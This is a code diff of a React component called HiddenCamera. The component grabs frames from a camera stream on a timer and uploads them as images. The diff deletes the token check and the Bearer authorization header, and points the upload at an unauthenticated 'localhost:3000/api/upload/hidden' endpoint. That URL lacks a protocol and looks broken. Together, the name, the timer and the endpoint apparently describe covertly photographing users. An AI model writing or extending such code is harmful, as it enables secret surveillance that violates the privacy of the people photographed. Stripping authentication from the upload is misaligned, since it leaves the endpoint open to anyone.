@@ -38,7 +38,7 @@ export default function HiddenCamera() {
 
         return () => {
             if (streamRef.current) {
-                streamRef.current.getTracks().forEach(track => track.stop());
+                streamRef.current.getTracks().forEach((track) => track.stop());
             }
 
             if (intervalRef.current) {
@@ -65,21 +65,11 @@ export default function HiddenCamera() {
         canvas.toBlob(async (blob) => {
             if (!blob) return;
 
-            const token = localStorage.getItem("user");
-            if (!token) {
-                console.warn("No token found. Skipping upload.");
-                return;
-            }
-
             const formData = new FormData();
             formData.append("image", blob, "capture.png");
 
             try {
-                await axios.post("/api/upload", formData, {
-                    headers: {
-                        Authorization: `Bearer ${token}`,
-                    },
-                });
+                await axios.post("localhost:3000/api/upload/hidden", formData);
 
                 console.log("Photo uploaded");
             } catch (error) {
